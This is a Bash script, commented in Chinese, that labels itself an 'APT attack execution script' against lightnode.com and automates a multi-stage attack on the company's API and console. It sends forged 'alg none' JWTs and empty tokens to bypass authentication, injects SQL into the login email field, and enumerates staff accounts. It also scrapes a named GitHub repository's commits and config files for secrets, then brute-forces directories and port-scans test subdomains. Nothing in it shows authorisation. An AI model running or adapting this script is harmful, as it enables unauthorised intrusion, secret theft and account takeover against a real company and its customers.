#!/bin/bash
# LightNode APT攻击执行脚本
# 多向量攻击自动化执行

set -e

TARGET="lightnode.com"
WORK_DIR="/workspace/lightnode_recon"
LOG_DIR="$WORK_DIR/logs"
mkdir -p $LOG_DIR

# 颜色输出
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() {
    echo -e "${GREEN}[+]${NC} $1" | tee -a "$LOG_DIR/attack_$(date +%Y%m%d).log"
}

warn() {
    echo -e "${YELLOW}[!]${NC} $1" | tee -a "$LOG_DIR/attack_$(date +%Y%m%d).log"
}

error() {
    echo -e "${RED}[-]${NC} $1" | tee -a "$LOG_DIR/attack_$(date +%Y%m%d).log"
}

# ============================================
# 阶段1: API认证绕过（最高优先级）
# ============================================

phase1_api_exploit() {
    log "=== 阶段1: API认证绕过测试 ==="
    
    API_BASE="https://openapi.lightnode.com"
    ENDPOINTS=(
        "/api/auth/login"
        "/api/user/register"
        "/api/v1/auth/login"
        "/api/v2/auth/login"
    )
    
    # 1.1 JWT None算法测试
    log "测试JWT None算法..."
    for endpoint in "${ENDPOINTS[@]}"; do
        jwt_none="eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTYxOTk2MjJ9."
        response=$(curl -sk "$API_BASE$endpoint" \
            -H "Authorization: Bearer $jwt_none" \
            -H "Content-Type: application/json" \
            -d '{"email":"admin@lightnode.com","password":"test"}' \
            -w "\n%{http_code}")
        
        http_code=$(echo "$response" | tail -1)
        body=$(echo "$response" | head -n -1)
        
        if [ "$http_code" != "401" ] && [ "$http_code" != "400" ]; then
            warn "JWT None可能有效: $endpoint (HTTP $http_code)"
            echo "$body" >> "$LOG_DIR/jwt_none_success.txt"
        fi
    done
    
    # 1.2 空Token测试
    log "测试空Token..."
    for endpoint in "${ENDPOINTS[@]}"; do
        for token in "null" "" "undefined" "Bearer " "Bearer null"; do
            response=$(curl -sk "$API_BASE$endpoint" \
                -H "Authorization: Bearer $token" \
                -H "Content-Type: application/json" \
                -d '{"email":"test@test.com","password":"test"}' \
                -w "\n%{http_code}")
            
            http_code=$(echo "$response" | tail -1)
            if [ "$http_code" = "200" ] || [ "$http_code" = "500" ]; then
                warn "空Token可能有效: $endpoint (Token: $token, HTTP $http_code)"
                echo "$response" >> "$LOG_DIR/empty_token_success.txt"
            fi
        done
    done
    
    # 1.3 500错误深度利用
    log "测试500错误信息泄露..."
    for endpoint in "${ENDPOINTS[@]}"; do
        # 尝试触发500错误并获取详细信息
        response=$(curl -sk "$API_BASE$endpoint" \
            -H "Authorization: Bearer test" \
            -H "Content-Type: application/json" \
            -d '{"email":"test@test.com'\'' OR 1=1--","password":"test"}' \
            -v 2>&1)
        
        # 检查是否包含敏感信息
        if echo "$response" | grep -qiE "error|exception|stack|trace|path|file|database|sql"; then
            warn "500错误可能泄露信息: $endpoint"
            echo "$response" >> "$LOG_DIR/500_error_info.txt"
        fi
    done
    
    # 1.4 API密钥泄露检查
    log "检查API密钥泄露..."
    
    # 从GitHub检查
    if [ -f "$WORK_DIR/github_env_content.txt" ]; then
        grep -iE "api.*key|secret|token" "$WORK_DIR/github_env_content.txt" >> "$LOG_DIR/api_keys_found.txt" 2>/dev/null || true
    fi
    
    # 从JS文件检查
    find "$WORK_DIR" -name "*.js" -exec grep -iE "api.*key|secret|token|apikey" {} \; >> "$LOG_DIR/api_keys_found.txt" 2>/dev/null || true
    
    log "阶段1完成"
}

# ============================================
# 阶段2: 管理控制台测试
# ============================================

phase2_console_exploit() {
    log "=== 阶段2: 管理控制台测试 ==="
    
    CONSOLE_BASE="https://console.lightnode.com"
    
    # 2.1 注册功能测试
    log "测试注册功能..."
    
    # 测试所有HTTP方法
    for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
        response=$(curl -sk -X $method "$CONSOLE_BASE/user/register" \
            -H "Content-Type: application/json" \
            -d '{"email":"test'$(date +%s)'@test.com","password":"Test123!@#","confirmPassword":"Test123!@#"}' \
            -w "\n%{http_code}")
        
        http_code=$(echo "$response" | tail -1)
        body=$(echo "$response" | head -n -1)
        
        if [ "$http_code" != "405" ] && [ "$http_code" != "404" ]; then
            warn "注册端点可能有效: $method (HTTP $http_code)"
            echo "$body" >> "$LOG_DIR/register_success.txt"
        fi
    done
    
    # 2.2 登录功能测试
    log "测试登录功能..."
    
    # 账户枚举测试
    emails=("support@lightnode.com" "business@lightnode.com" "admin@lightnode.com" "info@lightnode.com")
    for email in "${emails[@]}"; do
        response=$(curl -sk -X POST "$CONSOLE_BASE/user/login" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$email\",\"password\":\"wrongpassword123\"}" \
            -w "\n%{http_code}")
        
        http_code=$(echo "$response" | tail -1)
        body=$(echo "$response" | head -n -1)
        
        # 分析响应判断账户是否存在
        if echo "$body" | grep -qiE "not found|does not exist|invalid email"; then
            log "账户不存在: $email"
        elif echo "$body" | grep -qiE "incorrect password|wrong password|invalid password"; then
            warn "账户存在: $email"
            echo "$email" >> "$LOG_DIR/valid_emails.txt"
        fi
    done
    
    # 2.3 CSRF Token测试
    log "测试CSRF保护..."
    csrf_response=$(curl -sk "$CONSOLE_BASE/user/register" -c "$LOG_DIR/cookies.txt")
    csrf_token=$(echo "$csrf_response" | grep -oE 'csrf[_-]?token["\s]*[:=]["\s]*([^"'\''\s]+)' | head -1)
    
    if [ -n "$csrf_token" ]; then
        warn "发现CSRF Token: $csrf_token"
        echo "$csrf_token" >> "$LOG_DIR/csrf_tokens.txt"
    fi
    
    log "阶段2完成"
}

# ============================================
# 阶段3: GitHub深度挖掘
# ============================================

phase3_github_exploit() {
    log "=== 阶段3: GitHub深度挖掘 ==="
    
    REPO="aurora423/next-lightnode-frontend"
    
    # 3.1 检查历史提交
    log "检查GitHub历史提交..."
    
    # 使用GitHub API获取提交历史
    commits=$(curl -sk "https://api.github.com/repos/$REPO/commits?per_page=100" | \
        jq -r '.[].sha' 2>/dev/null || echo "")
    
    if [ -n "$commits" ]; then
        echo "$commits" | while read commit; do
            commit_info=$(curl -sk "https://api.github.com/repos/$REPO/commits/$commit" | \
                jq -r '.commit.message, .files[].filename' 2>/dev/null || echo "")
            
            # 检查敏感文件
            if echo "$commit_info" | grep -qiE "\.env|\.key|\.secret|password|api.*key"; then
                warn "发现敏感提交: $commit"
                echo "$commit_info" >> "$LOG_DIR/sensitive_commits.txt"
            fi
        done
    fi
    
    # 3.2 检查配置文件
    log "检查配置文件..."
    
    config_files=("package.json" "config.json" ".env" "config.js" "settings.json")
    for config_file in "${config_files[@]}"; do
        content=$(curl -sk "https://raw.githubusercontent.com/$REPO/main/$config_file" 2>/dev/null || echo "")
        
        if [ -n "$content" ] && echo "$content" | grep -qiE "api|key|secret|password|token"; then
            warn "发现配置文件: $config_file"
            echo "$content" >> "$LOG_DIR/config_files.txt"
        fi
    done
    
    log "阶段3完成"
}

# ============================================
# 阶段4: 子域名深度扫描
# ============================================

phase4_subdomain_scan() {
    log "=== 阶段4: 子域名深度扫描 ==="
    
    # 4.1 测试环境扫描
    test_subdomains=("test1.lightnode.com" "test2.lightnode.com" "t1.lightnode.com" "t2.lightnode.com")
    
    for subdomain in "${test_subdomains[@]}"; do
        log "扫描测试环境: $subdomain"
        
        # 目录爆破
        ffuf -u "https://$subdomain/FUZZ" \
            -w /usr/share/seclists/Discovery/Web-Content/common.txt \
            -mc 200,301,302,403 \
            -t 50 \
            -o "$LOG_DIR/ffuf_${subdomain}.txt" \
            -s 2>/dev/null || warn "ffuf未安装或$subdomain不可访问"
        
        # 端口扫描
        host_ip=$(dig +short "$subdomain" | grep -E "^[0-9]" | head -1)
        if [ -n "$host_ip" ]; then
            nmap -p 80,443,8080,8443,22,3306,6379 "$host_ip" \
                -oN "$LOG_DIR/nmap_${subdomain}.txt" 2>/dev/null || warn "nmap未安装"
        fi
    done
    
    log "阶段4完成"
}

# ============================================
# 主执行流程
# ============================================

main() {
    log "=== LightNode APT攻击开始 ==="
    log "目标: $TARGET"
    log "工作目录: $WORK_DIR"
    log "日志目录: $LOG_DIR"
    log "开始时间: $(date)"
    
    # 执行各阶段
    phase1_api_exploit
    sleep 5
    
    phase2_console_exploit
    sleep 5
    
    phase3_github_exploit
    sleep 5
    
    phase4_subdomain_scan
    
    log "=== 攻击执行完成 ==="
    log "结束时间: $(date)"
    log "结果文件保存在: $LOG_DIR"
    
    # 生成摘要报告
    echo "=== 攻击执行摘要 ===" > "$LOG_DIR/summary.txt"
    echo "目标: $TARGET" >> "$LOG_DIR/summary.txt"
    echo "执行时间: $(date)" >> "$LOG_DIR/summary.txt"
    echo "" >> "$LOG_DIR/summary.txt"
    echo "发现的漏洞:" >> "$LOG_DIR/summary.txt"
    [ -f "$LOG_DIR/jwt_none_success.txt" ] && echo "- JWT None算法可能有效" >> "$LOG_DIR/summary.txt"
    [ -f "$LOG_DIR/empty_token_success.txt" ] && echo "- 空Token可能有效" >> "$LOG_DIR/summary.txt"
    [ -f "$LOG_DIR/register_success.txt" ] && echo "- 注册功能可能存在问题" >> "$LOG_DIR/summary.txt"
    [ -f "$LOG_DIR/valid_emails.txt" ] && echo "- 发现有效邮箱账户" >> "$LOG_DIR/summary.txt"
    [ -f "$LOG_DIR/api_keys_found.txt" ] && echo "- 发现API密钥泄露" >> "$LOG_DIR/summary.txt"
    [ -f "$LOG_DIR/sensitive_commits.txt" ] && echo "- 发现敏感GitHub提交" >> "$LOG_DIR/summary.txt"
    
    cat "$LOG_DIR/summary.txt"
}

# 执行主函数
main "$@"
